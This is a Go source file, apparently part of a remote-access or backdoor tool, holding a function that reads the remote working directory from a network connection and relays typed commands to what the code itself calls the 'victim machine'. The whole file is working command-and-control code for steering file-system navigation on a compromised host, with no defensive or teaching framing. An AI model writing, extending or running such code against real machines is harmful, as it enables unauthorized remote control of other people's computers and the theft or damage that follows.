package move

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
)

// Navigate file system
func Navigate(connection net.Conn) (err error) {
	ConnectionReader := bufio.NewReader(connection)
	initialpwdraw, err := ConnectionReader.ReadString('\n')
	initialpwd := strings.TrimSuffix(initialpwdraw, "\n")
	loopControl := true

	fmt.Println(initialpwd, ">>")
	for loopControl {

		CommandReader := bufio.NewReader(os.Stdin)
		usercmdraw, err := CommandReader.ReadString('\n')

		if err != nil {
			fmt.Println("[+]unable to read command ", err)
		}

		nbytes, err := connection.Write([]byte(usercmdraw))
		fmt.Println("[+] ", nbytes, " were sent to the victim machine ")

		if err != nil {
			fmt.Println("[+] ", nbytes, " were not sent to the victim machine ", err)
		}
		if usercmdraw == "stop\n" {
			loopControl = false
			break
		}

		newpwd, err := ConnectionReader.ReadString('\n')
		fmt.Println("[+] Working Directory changed to  ", newpwd)
		initialpwd = newpwd
	}
	return
}
